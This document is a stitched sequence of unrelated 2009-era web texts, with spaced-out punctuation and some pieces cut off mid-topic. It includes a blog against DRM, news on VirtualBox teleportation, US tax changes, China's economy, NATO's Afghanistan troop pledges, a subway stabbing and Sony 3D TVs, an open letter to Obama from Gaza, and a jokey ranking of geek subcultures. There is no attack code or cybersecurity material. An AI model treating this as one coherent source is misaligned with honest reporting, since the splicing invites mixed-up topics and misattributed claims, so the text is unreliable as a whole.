Theoretically , if a piece of media is “ protected ” with DRM , only those people who purchase the rights to enjoy it can enjoy it .
Unfortunately , as everyone but the big companies that insist on using it know , all it manages to do is punish the honest people .
People who have tried to play Amazon Video on Demand videos on their Linux desktops or listen to Audible audiobooks on their no - name MP3 players know exactly what I mean .
The truth of the matter is , if people are dishonest enough to use copyrighted materials they have n't paid for , DRM does little more than give them an “ excuse ” for their pirating ways .
Right now , users are given the choice of paying money for limited , restricted access to media , or to download illegally fully functional , cross-platform , unrestricted media for free from torrent sites .
I have two messages for two different groups :
1. Media publishing companies : make it easy for users to buy access to your media , and make that media flexible , archive - able and affordable .
Yes , people will pirate your stuff — just like they do now .
The difference will be that your honest clients wo n't hate you , and you 'll actually gain some clients because you will be offering what people really want .
2. Frustrated users : look , I 'm with you .
DRM frustrates me too .
Although I 'm not expecting to convert those among us who choose to pirate media , I would hope that we'd all support those companies ( and individuals , in Wil Wheaton 's case ) that “ get it ” .
The only way we 'll be part of the solution when it comes to eliminating DRM is actually to buy non-DRM stuff .
At the very least , every time you pirate something because you can't buy it legitimately , e-mail the companies and let them know .
If they see lost sales , perhaps they will rethink their approach to digital media .
I could go on and on about the insanity of Blu-ray DRM and the like , but I do n't have the energy .
Plus , I want to go watch the hi-def movie I just ripped on my Linux laptop .
I 'll have to remember to e-mail the movie producer about my morally justifiable , but legally questionable ways ....
HDR Photos By Grey Jones
High dynamic range imaging ( HDR ) is a set of techniques that allows a greater dynamic range of luminance between light and dark areas of a scene than normal digital imaging technique .
The intention of HDR is to accurately represent the wide range of intensity levels found in real scenes ranging from direct sunlight to shadows .
The following photos I have selected from Grey Jones collection .

Yesterday ( today if you ’re in the US ) , Sun released the latest version of its virtualisation solution , VirtualBox 3.1 .
Among speed improvements and other smaller features , the biggest news is that Virtualox 3.1 introduces something called teleportation : you can move running VMs between machines – servers or clients , different architectures , different host operating systems , it does n’t matter to VirtualBox .
Coincidentally , this reminded me of an idea I once had about moving running applications between machines .
Sun released VirtualBox 3.1 on November 30 , and claims that it brings improved execution speed , improved network performance , and a 2D graphics acceleration feature for Windows virtual machines .
Its biggest feature , however , is teleportation .
With this feature , you can move running virtual machines between different hosts .
You can move them across different architectures , different host operating systems , and between servers and clients .
this feature makes it possible to service your hardware without shutting down your VMs , as you can simply move them to another piece of hardware for the time being .
“ The ability to teleport running virtual machines from one computer to another allows system administrators to perform essential maintenance with zero downtime of their IT systems , ” said Jim McHugh , Sun ’s vice president of data centre software marketing , “ As a cross - platform hypervisor , VirtualBox allows customers to easily evaluate and deploy virtualized systems , using their existing x86 hardware , operating systems and skill sets . ”
I ’d like to make a big leap , as this new feature made me think of something that I sometimes think about when I ’m mulling over the future of computing – more specifically , my perfect world of computing .
One of the features I ’d like to have is the ability to move running applications from one computer to the other – transparently , without having to shut them down or whatever .
Let me illustrate with two scenarios .
You ’re working on your home desktop .
You ’re trying to finish a document you ’re working on , but you ’re running a little late .
How cool would it be if you could simply “ move ” the running application to your laptop , without having to worry about transferring the files you ’re working on ?
Or , the other way around .
You ’re on the train , working on a long email on your smartphone .
You come home , and of course would prefer to finish the email on your desktop , with proper screen and keyboard .
You just tap a button on your phone , and the mail application on your phone moves over to your desktop , where you can continue writing the email right away .
I ’ve also been thinking about the user interface portion of this functionality , and that ’s actually harder than you think .
The straightforward option would be to have machines in range listed as icons , and you can just drag and drop a running application to the machine on which you want to continue using that application .
You could also think of more exotic ways of transferring applications – I thought of holding your phone next to your desktop ’s or laptop ’s display , and simply tap the display with your phone – the iPhone has an application called “ Bump ” which more or less works this way to transfer contacts , but it only works between iPhones .
It ’s a big leap from VirtualBox to this hypothetical feature , but there you have it .
I ’m always surprised by the ingenuity of programmers , so I ’m pretty sure other people have thought of this stuff way before I have .
Do any of you know of efforts that seek to implement functionality like this ?
I have come to expect that the open source community especially is usually three steps ahead of everyone else in exotic functionality like this .
SAN FRANCISCO ( MarketWatch ) -- Some Americans likely will find their tax bills rising in about a year .
The George W. Bush - era tax cuts expire at the end of 2010 and the current outlook is that high - income Americans will take the brunt of the pain as income - tax and capital - gains rates revert to higher levels .
But experts also say it 's highly likely Congress will act to protect middle - and lower - income taxpayers .
" There are no facts about the future but if there were one it would be that the Bush tax cuts for the people below $ 200,000 a year are going to get extended , and the Bush tax cuts for singles above $ 200,000 and married couples above $ 250,000 are not going to get extended , " said Clint Stretch , Washington - based managing principal of tax policy at Deloitte Tax , a consulting firm .
Others agreed -- with caveats .
" The general sense has been that we are not going to have higher rates for anyone who does n't make $ 250,000 or more , " said Grace Allison , tax strategist with Northern Trust in Chicago .
" The problem that Congress is going to be up against is that extending the Bush tax cuts for lower - and middle - income taxpayers costs a little over $ 1 trillion over 10 years , " Allison said .
" So , basically , it 's going to be a very interesting year . "
That might be an understatement .
In early 2010 , President Obama 's tax panel , headed by former Federal Reserve Chairman Paul Volcker , is expected to publish its ideas on possible reform strategies .
" That could form the basis for a major tax - reform proposal , " said Mark Luscombe , a principal analyst with CCH Inc. , a Riverwoods , Ill. , tax publisher and unit of Wolters Kluwer .
" Of course , we had a tax - reform panel during the Bush administration .
It issued its report and it was ignored , so that 's always a possibility . "
More tax hikes -- and tax cuts
But wait , there 's more -- at least for some taxpayers .
Proposals to pay for health - care reform , should they come to pass , could bring even higher tax rates for high - income filers .
In the House bill , for instance , there 's 5.4 % surtax on modified adjusted gross income in excess of $ 500,000 for single filers or $ 1 million for couples .
And , keep in mind : Some of Bush 's tax cuts are n't done phasing in yet .
While higher - income filers for years have been subject to a reduction ( usually about 3 % ) in the value of their itemized deductions and personal exemptions , that hit has gotten progressively smaller in recent years , thanks to Bush 's 2001 tax law .
In 2010 , higher - income individuals can take full advantage of itemized deductions and exemptions without facing that reduction .
After 2010 , that tax hit is back in full swing .
Meanwhile , a number of other tax perks are likely to be extended for 2010 , including the deduction for state and local sales tax , the additional standard deduction for real property taxes , the deduction for tuition and educational expenses , and a deduction for teachers ' classroom expenses .
The House passed the Tax Extenders Act of 2009 on Dec. 9 .
Until the Senate acts , there 's no guarantee what the final law will look like , but experts said those provisions will likely pass .
And the estate tax ?
It 's likely lawmakers will enact legislation to make sure the tax does n't disappear in 2010 as current law has it doing , experts said .
The House passed a bill Dec. 3 that makes permanent the 2009 provisions : a top marginal rate of 45 % on estates larger than $ 3.5 million or $ 7 million for married couples .
Now it 's up to the Senate to act .
( Current law has the estate - tax rate reverting to a 55 % levy on estates worth more than $ 1 million after 2010 . )
Some are predicting Congress will enact a one - year extension of the 2009 law and then revisit the issue in 2010 , CCH 's Luscombe said .
Capital - gains rates set to rise
Lawmakers are likely to address the demise of the Bush - era income - tax cuts relatively early in the year , some say .
" Next year is an election year and I think it is not in their interests to have been unable to resolve tax cuts for the middle class going into the election , " Stretch said .
" The incumbents want to be able to go around the country talking about how they voted for a bill extending the tax cuts for middle - class taxpayers . "
Right now , the marginal tax rates are 10 % , 15 % , 25 % , 28 % , 33 % and 35 % .
Obama and some Democrats propose to keep the lowest four rates , but let the highest two revert back to their pre-2001 levels of 36 % and 39.6 % .
If lawmakers do nothing , the tax rates would revert to their earlier levels of 15 % , 28 % , 31 % , 36 % and 39.6 % .
The Bush legislation also brought a 15 % tax rate on long - term capital gains and qualified dividends .
And the rate drops to 0 % for filers in the lowest two tax brackets .
Those rates , too , are set to expire at the end of 2010 .
Under current law , capital - gains rates would go back to 20 % ( 10 % for some lower - income filers ) and qualified dividends would be taxed as ordinary income up to the top rate of 39.6 % .
Obama proposes to levy capital - gains and dividend tax rates of 20 % for taxpayers in the two highest income - tax brackets , and let the 15 % and 0 % rates continue for those in lower brackets .
Still , do n't let tax law guide your investment decisions .
" There 's going to be a lot of excited talk about tax rates going up .
People ought to engage their common sense before they go out and do a lot of stuff , " Deloitte 's Stretch said , adding that a 15 % versus 20 % rate on $ 10,000 is $ 500 of tax savings and " not a big deal . "
However , if you 're in a higher - income bracket , you 'll probably want to avoid delaying income past 2010 if you do n't need to .
" You'd be deferring it into a higher tax rate if you 're in those upper tax brackets , " said Greg Rosica , Tampa , Fla . - based tax partner at Ernst & Young and co-author of the " The Ernst & Young Tax Guide . "
" Conversely , deductions that you might be able to take in 2010 or 2011 might be much more valuable to you in 2011 because they 'll offset a higher tax rate in 2011 . "
Alternative minimum tax
In previous years , lawmakers included a " patch " for the alternative minimum tax in their end - of - year extenders bill , but no such fix is in the current House version , likely because of the cost .
Because the AMT is not indexed to inflation , it needs an annual tweak to ensure millions more taxpayers do n't fall prey to this parallel tax system .
Fixing the AMT " is very , very , very expensive and that is going to be one of the other issues that will come to the fore in 2010 , " Allison said .
" What to do with the alternative minimum tax ? "
Roth IRA conversion
A useful perk for high - income savers : Starting Jan. 1 , there 's no income limit on who can convert from a traditional to a Roth IRA .
While there are good reasons to consider a Roth -- tax - free growth and beneficial inheritance rules among them -- proceed with caution .
For instance , if you do n't have cash on hand to pay the income - tax bill that comes due when you pull out your IRA money , be careful .
" Say you 've got some other assets , but to convert to cash you have to pay capital gains , then [ a conversion ] becomes a less attractive option for you , " said John H. Gin of Gin and Associates , an Ameriprise Private Wealth Advisory practice in Metairie , La .
Also , people in high - income - tax states should keep in mind that some state exemptions get phased out at higher income levels , Gin said .
" A lot of these Roth conversion calculators do n't take that into account . "
If you do convert to a Roth in 2010 , you can choose to pay half the taxes in 2011 and half in 2012 -- but opting to do it in 2010 may make more sense for higher - income taxpayers because of the likelihood of tax - rate increases in 2011 .
Still , some advisers say Roth IRAs make sense for plenty of people .
" That 's an account that continues to grow tax - free and everything comes out of it , including the earnings , tax - free down the road , " Rosica said .
Also , Roth IRAs " can be left to family members with much more favorable tax consequences as to when they have to start withdrawing than the traditional IRA , " he said .
" It 's hard to give any kinds of rules of thumb on this one but particularly if it's a wealthier family that does n't anticipate needing to draw from their IRA to fund retirement and intends to leave it to family members , this is probably a very attractive exercise for them to look at . "
OTTAWA --
When should you start wearing a poppy ?
It 's a question many of us ask every fall , as the little red emblems start popping up on the lapels of business people and children alike as a tribute to fallen soldiers .
Many people think that date is the day after Halloween - on Nov. 1 .
Others say poppies should be worn in the week running up to Remembrance Day .
The British Broadcasting Corp. actually chooses a day for its presenters to start wearing poppies each year .
This year , it was from 6 a.m. on Oct. 24 .
Veterans Affairs Canada says poppies can be worn from the beginning of the poppy drive , which this year was Oct. 30 .
The annual campaign begins " on the last Friday of October and ( poppies ) can be worn at any time after that date , " Veterans Affairs says on its website .
But it adds : " Although it is tradition for the poppy to be worn only during the annual Remembrance period , a person may wear a Poppy any time he or she wishes to do so . "
More than 1,500 branches of the Royal Canadian Legion started the poppy campaign Friday .
The veterans ' organization suggests the poppy be worn on the left lapel of a garment or as close to the heart as possible .
The poppy is the national symbol of remembrance for the 117,000 men and women who gave their lives during military service around the world .
Wilf Edmond , national president of the legion , said the organization wants all Canadians to wear one in remembrance of those who have died to keep Canada and other countries free from tyranny .
Each year , about 18 million poppies are distributed in communities across Canada .
The money goes to trust funds , and is meant to be used to improve the lives of people in the communities where it was raised .
Manufacturing accounts for about 40 % of China 's economy China has announced it is targeting economic growth of 8 % in 2010 , despite the continuing effects of the global downturn .
Beijing has targeted 8 % growth for the past few years , and has yet to fall short of the target .
Analysts said the country 's economy was likely to beat the target , growing by 9 % or more .
China , the world 's third - largest economy , has been boosted by massive government stimulus measures .
The Chinese government also said industrial production would grow rapidly next year .
' Overshoot ' likely
The economic momentum China has generated means it will be easier to achieve 8 % in 2010 than it was this year
Alaistair Chan , Moody's Economy.com
" Based on the central government 's target for around 8 % economic growth , we 're aiming for around 11 % growth in industrial output , " said Minister of Industry and Information Technology Li Yizhong .
Industrial output in November rose to its strongest position since June 2007 , rising 19.2 % from a year earlier .
Another strong month in December would see output rise by 11 % this year as well .
Analysts said the target for overall economic growth should be achievable .
" They 'll probably overshoot 8 % next year , " said Alaistair Chan at Moody 's Economy.com .
" The economic momentum China has generated means it will be easier to achieve 8 % in 2010 than it was this year . "
GDP GROWTH FORECASTS 2010 US 1.5 % Germany 0.3 % France 0.9 % Italy 0.2 % UK 0.9 % Japan 1.7 % Canada 2.1 % China 9 % India 6.4 % Source : International Monetary Fund Mr Chan forecast growth of 9.3 % next year .
This compares favourably with other major economies , most of which are forecast to experience modest growth next year .
Consumer spending However , Mr Li cautioned against " blind optimism " , saying that China 's industry was over - reliant on exports , where economic recovery remained " fragile " .
Earlier this month , the Chinese government said it would maintain its current fiscal and monetary stimulus measures , and look specifically to boost domestic demand in order to reduce its dependence on exports .
Recent retail sales figures show that consumers are spending more .
The National Bureau of Statistics ( NBS ) said that sales were up 15.8 % in November compared with the same time last year .
Consumer prices also rose year - on - year in November for the first time in 10 months .

Nato nations today pledged an extra 7,000 troops for Afghanistan as the US secretary of state , Hillary Clinton , in Europe to drum up more military support for the campaign , acknowledged that America was becoming " weary of war " .
At least 25 nations would provide the additional forces from next year , " with more to come " , the Nato secretary general , Anders Fogh Rasmussen , told reporters after talks with Clinton .
" The strongest message in the room today was solidarity , " Rasmussen said .
" Nations are backing up their words with deeds . "
Clinton is in Brussels to press Washington 's allies in Afghanistan to commit more troops , particularly combat forces , after Barack Obama 's decision to send 30,000 more American soldiers to Afghanistan .
She was due later to have separate discussions with ministers from countries within and outside Nato .
Citing Obama 's promise to begin withdrawing US forces in July 2011 , Clinton said that while the need for the extra forces was immediate , " their presence will not be indefinite " .
She acknowledged the human toll exacted on troops from both the US and their allies in Afghanistan and elsewhere in recent years .
" Today , our people are weary of war , " she said .
" But we can not ignore reality .
The extremists continue to target innocent people and sow destruction across continents .
From the remote mountains of Afghanistan and Pakistan , they plot future attacks .
As secretary general Rasmussen said earlier this week , ' This is our fight , together . '
And we must finish it together . "
Addressing the North Atlantic Council , Nato 's highest political body , Clinton said that eventual troop withdrawal was dependent on a gradual transfer of responsibility to Afghan security forces .
" The pace , size , and scope of the drawdown will be predicated on the situation on the ground , " she said .
" If things are going well , a larger number of forces could be removed from more areas .
If not , the size and speed of the drawdown will be adjusted accordingly . "
The US has about 71,000 troops in the country , as against about 38,000 sent by 42 other Nato and non-Nato nations .
The foreign secretary , David Miliband , also asked Nato members today to lend their support to efforts to bring peace to Afghanistan .
" We all know that in the 1990s , Afghanistan was the incubator of international terrorism , the incubator of choice for global jihad , " he said .
" The badlands of the Afghan - Pakistan border are a threat to people everywhere , whatever their religion , and that 's why it 's very important that we make progress . "
Also in Brussels was General Stanley McChrystal , the top US commander in Afghanistan and the main proponent of a " surge " strategy in the country , who was to explain the state of the mission to Nato 's main political council .
Before Clinton left , there was a degree of scepticism in America over the extent of help the US would receive , whatever the Nato promises .
Professor Eliot Cohen , a former state department adviser , spelled out in today 's Wall Street Journal criticism of US allies often heard around Washington when he predicted that the Nato figures would be achieved " only by accounting tricks " .
He wrote : " The Europeans have repeatedly revealed their aversion to combat . "
Nearly 30 petrified passengers were trapped on a Midtown hell train yesterday with a knife - wielding madman and the blood - soaked body of a straphanger he just stabbed to death in a senseless argument over a seat .
The Bronx - bound D train came to a screeching halt at around 2 a.m. in the tunnel between the Rockefeller Center and Seventh Avenue stations when a rider yanked the emergency cord after watching the carnage unfold .
WERE YOU ON THE TRAIN ?
CALL THE NEW YORK POST AT 212-930-8500 !
The group of riders were stuck in the car behind locked doors as a pool of blood began to form around the dying man and the suspect , Gerardo Sanchez , 37 , of The Bronx , coldly stood over him .
Eventually , Sanchez strolled to one end of the car , and the rest of the passengers fled to the opposite end .
Sources identified the victim as Dwight Johnson , 36 , who appeared to be homeless .
Sanchez , an exterminator , boarded the train at Rockefeller Center and asked the victim to remove his bag from an unoccupied seat — saying he had just gotten off work and was tired .
Johnson refused , and a cursing match quickly ensued .
The victim , who stood at least 6 inches taller than the 5 - foot - 6 Sanchez , punched his antagonist in the face , police sources said .
Sanchez — who was still wearing his work shirt emblazoned with his name , “ Jerry , ” and the company logo , “ Terminate Control ” — bugged out , pulling a steak knife and plunging it into Johnson ’s jugular and hand , police said .
Some of the stunned passengers frantically pounded on the train operator ’s door , while another rider pulled the emergency cord .
The train operator radioed the command center , which quickly called police .
“ The operator was informed by a passenger that another passenger had been stabbed and that he needed police and medical attention , ” said a transit spokesman .
Cops relayed word to the operator to keep the car sealed until they arrived — leaving horrified straphangers trapped in with the killer and the body for about five minutes until the doors opened at the station , the sources said .
Sanchez managed to pry one of the doors open just enough to drop the knife out of the train as they waited for police to arrive , the sources said .
Cops later recovered the weapon .
Responding officers found Sanchez standing in front of the train door with several passengers pointing at him , the sources said .
“ He punched me in the mouth , ” the suspect then allegedly told cops .
Paramedics arrived and declared Johnson dead at the scene .
Police sources said both men had prior arrests — the alleged killer for a 2002 drug case and the victim for weapons possession in 2004 .
Sanchez was charged with murder and weapons possession .
His Bronx friends and neighbors were shocked at the violence .
“ He was very respectful .
He did n’t bother anybody .
He was always talking about his son , ” said a friend who has known the exterminator since he moved into a Bedford Park rooming house eight months ago .
Robert del Rosario , 20 , a bodega worker , was taken aback when he learned the tragic news .
“ I still do n’t believe it .
To me , he was a happy person .
He would make jokes in the store and dance to all the songs .
“ It must have been in self - defense . ”

It ’s normal to be afraid of something you do n’t understand .
For example , math , Tyler Perry , or whether or not girls actually fart are all quite scary things .
However , I ’m sure with a little research you ’ll find that whatever was scaring you is really just Canadians with flashlights …
Also , if you ’re living in the U.S. you may be wondering who those neighbors to the North are , with all their free health insurance and milk in bags … well , you ’re in luck , there ’s a sign for that :
Sony expects that 3D televisions will make up between 30 percent and 50 percent of all sets it sells in the financial year that begins in April 2012 , a senior executive said late last week .
The goal further indicates Sony 's confidence in 3D entertainment ahead of a roll - out of the technology next year .
Sony first announced its 3D ambitions in early September when President and CEO Howard Stringer said the company planned to launch 3D - capable Bravia TV sets and Blu-ray Disc players as well as adding 3D to the PlayStation 3 .
Sony 's plans for the latter two products are already becoming clear : the Blu-ray Disc Association is working on a 3D disc standard while Sony plans to add 3D to all models of the PlayStation 3 via a firmware update .
On the TV side , perhaps the largest and most important part of the picture , Sony had n't disclosed many details but now that picture is starting to come into focus .
The 3D - compatible sets will include a small piece of additional hardware that enables them to show 3D content but they 'll also work as conventional television sets , said Hiroshi Yoshioka , executive deputy president of Sony and head of the unit that includes its TV business , in an interview .
Yoshioka did n't elaborate on the additional hardware but said it would only add a little to the production cost of the TV set .
By far the biggest expense for 3D viewing will be the glasses that are required to produce the illusion of a three - dimensional image .
Those could cost up to around US $ 200 and wo n't necessarily be bundled with a television .
By selling the glasses separately Sony will be able to keep its 3D - compatible sets competitive with other sets while only requiring a higher outlay from customers who want to experience 3D content .
Yoshioka stressed that Sony has yet to determine the premium for 3D - compatible sets and whether it will bundle the glasses or sell them separately .
But the TV business is perhaps the most price - sensitive of all of Sony 's product areas , particularly in the U.S. market , so the company will likely want to keep additional costs down .
Sony 's TV business has been losing money for six years but Stringer committed this month to turning a profit on televisions in the next financial year , which runs from April 2010 to March 2011 .
Success with 3D will be vital if Sony is to accomplish its goal of grabbing a 20 percent share of the LCD TV market within the next three years .
" It 's all up to the contents , " said Yoshioka .
Sony 's 3D plans revolve around gaming , movies and sports .
Sony is already working on gaming with the PlayStation 3 upgrade plans and its movies division , Sony Pictures , is already producing 3D movies .
If history is any indicator , sports is an additional area where users are willing to pay a little more money for a better experience .
The company 's existing relationship with broadcasters through its movie division and TV production house could serve well in promoting 3D but even if it does n't there will be a secondary route to 3D - capable sets .
Sony is expanding its PlayStation Network service to cover its televisions and will launch a new content delivery service next year that will pump movies , TV shows and other video content directly into Bravia TVs and Blu-ray Disc players from its own servers .
Smaller - scale experiments have already taken place in the U.S. , where Sony recently offered its " Cloudy with a Chance of Meatballs " movie to Internet - linked Bravia TVs ahead of the DVD release .
" So far there is a good response , " said Yoshioka of the trial .
Late last year " Hancock , " another Sony movie , was offered via the same route .
WASHINGTON — A planned November hearing by the US Senate Armed Services Committee to consider ending a ban on gays serving openly in the US military will be postponed , a spokeswoman indicated Friday .
“ We do not have a date ” for the hearing , said the aide , Tara Andringa .
Committee staff have been working on Afghanistan issues ahead of President Barack Obama ’s decision on whether to send more troops , and more recently on the aftermath of the shock rampage at the sprawling Fort Hood military base .

The panel ’s chairman , Democratic Senator Carl Levin , had said in late October that it would hold a hearing in November and that he hoped to “ to find a way to repeal ‘ Do n’t Ask , Do n’t Tell , ' ” as the policy is widely known .
Obama , who has drawn fire from gay rights ’ groups for not taking steps to freeze or repeal the rule , has said the US Congress is the best venue for undoing the policy , which was crafted in 1993 .
About 13,000 US service members have been discharged under the policy since then , and estimated costs through 2003 run at 95.4 million dollars in recruiting costs and 95.1 million in training replacements , according to the US Government Accountability Office .
An overwhelming number of Americans support allowing openly gay men and lesbians to serve in the US military .
The policy requires gays to keep quiet about their sexual orientation or face expulsion .

Raichu gets a hold of The Warden 's glasses
Updated with newer picture
I wanted to show off my camo shoes without spamming everyone with more Raichu pictures .
I took a pair of old shoes that I do n't wear often and just hot glued leftover camo fabric onto them .
And I made the little anklets cause I thought it needed something else .
I also made a pair of brown mittens , but after trying them on with the full costume , I 'd rather not use them .
They do n't look good and they 're a hassle to wear .

Opponents of the idea could also underestimate Mr Van Rompuy 's determination to get his own way .
Ostensibly chosen for his new job because of his skill as a consensus - builder , he is also known as a skilled and ruthless political operator , who is happy to play rough as well as smooth .
Last year he ordered the locks to be changed on a chamber in the Belgian parliament in order to prevent deputies holding a politically disruptive debate .
According to Belgian newspaper
De Morgen , van Rompuy told colleagues a few weeks ago that to achieve a top EU function you must " not ask for high office , but become a grey mouse , and offers will come . "

Haidar Eid , a professor of English , political commentator and resident of Gaza City , asks whether the president of the United States remembers anything from his long - ago meeting with the late Palestinian intellectual Edward Said .
Dear Mr. President :
You will probably not read this letter due to your busy schedule and the huge number of messages you receive from presidents , kings , princes , sheiks and prime ministers .
Who is a Palestinian academic from Gaza , after all , to have the guts to write an open letter to the president of the United States of America ?
What has triggered this letter is a picture of your Excellency sitting with the late Palestinian intellectual Edward Said .
That , of course , happened before 2004 - - i.e. , before you underwent a process of metamorphosis which I personally think is unprecedented in history .
Seeing you with Edward Said , I must say , surprised me .
Said , a true public intellectual , must have said something to you about the suffering of the Palestinian people .
In the picture , you and your wife seem to be listening attentively and admiringly to him .
But the point remains :
Did you really understand his eloquent , passionate defense of the rights of the indigenous inhabitants of Palestine ?
Judging from your recent policy shifts , I very much doubt it .
It is precisely the incongruity between the photograph and these policy shifts that has prompted this letter .
Mr. President :
The whole world celebrated your election as the first African American president of the U.S. I did not .
Neither did the inhabitants of the concentration camp where I live .
Your sympathetic visit to Sderot - - an Israeli town which was the Palestinian village of Najd until 1948 , when its people were ethnically cleansed -- your first visit three years earlier to a kibbutz in northern Israel in support of its residents , and your pledge to be committed to the security of the state of Israel and its " right " to retain unified Jerusalem as the capital city of the Jewish people , to give but few examples , were all clear indications of where your heart lies .
Another reason for the writing of this letter is shock at the indifference and arrogance with which Secretary of State Hillary Clinton dismissed Palestinian concerns about Israel 's illegal Jewish - only settlements in the West Bank .
Only a few weeks ago , you made the admirable statement that all Jewish settlement construction must halt , and you made it clear that this included the expansion of existing settlements as well as the construction of new settlements .
However , when Israeli Prime Minister Benjamin Netanyahu let it be known that he had no intention of stopping settlements , you missed a historic opportunity to draw a line -- no more billions and no more weapons for Israel unless and until this condition is met .
Now Secretary of State Clinton has the Herculean task of pretending that your position on Jewish settlements has not changed , though it is clear you have chosen not to use the very real power at your disposal to bring Israeli policy into line .
About six months after your election , you gave a speech in Cairo , addressed to the Arab and Islamic worlds , which some people found impressive .
I found it impressive in form , but not in substance , because your actions have not matched your rhetoric .
Why did I not buy the new language of the new American administration ?
Because while you were giving your speech , we were burying my neighbor , a terminally ill patient who needed treatment in a hospital abroad , since -- thanks to the siege imposed by your own administration and Israel on the Gaza Strip -- the facilities that would have saved his life are not available in Gaza .
Like more than 400 terminally ill people in Gaza , my neighbor lost his life .
In spite of the fine Arabic words of peace , " Salaam aleikum , " you made it crystal clear that the point of reference in any negotiations in the Israeli - Palestinian conflict is Israel 's security .
By doing that , Mr. President , you are effectively marginalizing the whole issue of Palestine , and unfortunately setting the stage for renewed Israeli assaults against a starving Gaza - - an entity that has , thanks to your " unbreakable " ties with Israel , been transformed into the largest concentration camp on Earth .
Your failure to support the Goldstone report from the United Nations , and your indifference , not to say your contribution , to Palestinian suffering and the process of " politicide " against the Palestinian people of Gaza is , to say the least , unfathomable , coming from a man who listened so earnestly to Edward Said .
Your advisers must have told you about the cutting off of medicine , food and fuel to the concentration camp where I live .
Patients in need of dialysis and other urgent medical treatment are dying every single day .
A majority of our children , many the same age as your two beautiful daughters , are badly undernourished .
You must have skimmed through the executive summary of the Goldstone report detailing the horror inflicted on 1.5 million civilians for 22 days -- horror caused by F - 16s , Apache helicopters and phosphorus bombs made in American factories .
Hundreds of children were burnt to death by phosphorus bombs ; pregnant women were brutally targeted in what Israeli soldiers boasted of on their T - shirts : " 1 bullet , 2 kills . "
And yet , not a single word of sympathy , Mr. President !
Edward Said had this to say upon his first visit to Gaza : " It 's the most terrifying place I 've ever been in ... It 's a horrifyingly sad place because of the desperation and misery of the way people live .
I was unprepared for camps that are much worse than anything I saw in South Africa . "
This was back in 1993 , Mr. President , before conditions dramatically deteriorated .
Gaza has now become , as the leading Israeli Human Rights Organization B'Tselem describes it , " the largest prison on Earth . "
Mr. Obama :
Unlike your predecessor , you seem to be a smart man .
You must have realized that a two - state solution has been rendered impossible by Israeli colonization of the West Bank , by the war on Gaza , by the construction of the apartheid wall , by the expansion of so - called Greater Jerusalem , and by the increase in the number of Jewish settlers in the West Bank .
You must have realized also that there are 6 million refugees , most of whom live in miserable conditions waiting for courageous , visionary leaders committed to true democracy , human rights and international law to implement UN resolution 194 .
And yet , you and your secretary of state , like every U.S. president since 1967 , have decided to support Israel in creating conditions that made the two - state solution impossible , impractical and unjust .
Were you a supporter of the Bantustan system in South Africa under the apartheid system ?
Are you opposed to equal rights and the transformation of Israel / Palestine into a state for all its citizens ?
The two - state solution means the Bantustanization of Palestine , a solution you , to our knowledge , never supported for South Africa .
Are you , Mr. President , opposed to civic democracy , which is the demand of most Palestinian civil society and grassroots organizations ?
This is what people like Martin Luther King and Steve Biko died for .
Was Nelson Mandela wrong to spend 27 years of his life in prison in pursuit of justice by demanding equality for the indigenous people of South Africa ?
Do you realize that what you are supporting in the Middle East is a racist solution par excellence ?
A solution based on " ethnic nationalism " ?
Your secretary of state and your envoy to the Middle East unashamedly stood , with beaming smiles , next to Avigdor Lieberman , who not only defends openly the ethnic cleansing of Palestinians , but also calls for a new genocide in Gaza !
Do you realize , Mr. President , that this Hitlerite fascist might become Israel 's next prime minister , thanks to your administration 's complacency and support ?
Our only immediate demand is that your administration insures that Israel fulfills its obligations in terms of international law .
Is that too much to ask ?
Mr. President Barack Hussein Obama :
We , the Palestinian people , are fed up !
Sincerely ,
Professor Haidar Eid
Gaza , Palestine

Sports Geeks
There 's a pretty huge difference between being able to dunk and knowing all of Xavier McDaniel 's home game stats for the 1994 season .
The former is called an athlete , the latter is called a statistics nerd .
But since they nerd out about sports , it 's totally socially acceptable and almost expected in certain circles .
I mean , when there are bars based around a fetish like this , you know you wo n't get beat up for being into it .

Car Geeks
Being a car geek , like being a sports geek , is all about an obsession with numbers .
But because those numbers are relating to things like torque and ratios and horsepower that come together to deliver the pleasure of going real fast in a hot car , this is seen as a pretty macho hobby .
Of course , if the obsession is more with the vroom vroom noises than the mechanics of the engine , you lose out on the major upside of being a geek : brains .

Sadly , making music is less cool than really liking to listen to music if you do n't play in a rock band .

Movie Geeks
Being super into movies is pretty socially acceptable , although there are definitely subgenres here .
Being super into art house films ?

Gamers
As kids who grew up with Atari grow up into adults purchasing Xboxes and PlayStations , video games are looking less like toys and more like a huge entertainment genre .
Hell , it 's tough to find a male in his 20's who is n't a gamer these days , and the video game population is only getting larger and larger .
But still , if you try talking about your favorite elemental sniper rifle from Borderlands or your best killstreak in Modern Warfare 2 while at the country club , you are going to be looked at like a child .

Gadget Nerds
Here 's one that we 're pretty familiar with around these parts .
While the popularity of gadgets such as the iPhone and Xbox 360 have made fetishizing shiny plastic objects much more acceptable and mainstream , being a zealous fanboy or a senseless early adopter will still get you funny looks by more casual gadget users and appreciators .
Because really , if you get a hard - on for firmware updates , no girls will want to talk to you unless you build said girls yourself .

Programmers
Everyone loves their huge selection of iPhone Apps and the amazing software that allows them to do so many different things on their computers , but the folks who actually make this stuff are still seen as shut - in geeks .
That 's slowly becoming less and less true , as programmers such as the Google guys and Mark Zuckerberg turn code monkeying into billions of dollars , which certainly helps reduce the stigma .
But still , Zuckerberg seems like a huge douche , so it may be a wash .

DIY Computer Geeks
Building your own computer is becoming more and more of a niche activity , with laptops becoming the computer of choice for most people and video games moving to the console space .
But there 's still a seriously active group of people who love the satisfaction that building your own rig brings , and the air of superiority it makes them feel for being able to navigate the nearly impenetrable world of PC components .
And man , do n't tell them you " custom ordered " your Dell unless you want to be faced with a halitosis - tainted laugh aimed right at you .

Cosplayers
You see cosplayers most often at conventions , such as ComicCon .
Basically , they dress up like their favorite video game or movie characters , often with a stunning amount of detail .

LARPers
Dungeons and Dragons is pretty geeky , but it's a board game , so it 's done in the privacy of one 's home .
Not LARPing .
LARPing is like taking D&D into the real world by dressing up like orcs and knights and such and having a big , fake , embarrassing battle in a public park .
There are no winners in these battles , only losers .

Furries
There 's nothing below Furries at the bottom of the geek barrel .

With Christmas right around the corner , we felt it was the perfect time to gather everyone up for a holiday themed ride .
Dress up like santa , an elf , or wear an ugly holiday sweater , and join us for a group ride around Downtown Dallas .
Also , we ’re teaming up with Toys for Tots , and asking everyone to bring an unwrapped gift before the ride .
The US Marines will be on hand to take the gifts before we head out .
This ride will begin at the new Main Street Garden Park at Harwood and Main Street ( across the street from where we took the Tweed Ride group photo ) on December 20th at 2:30 PM .
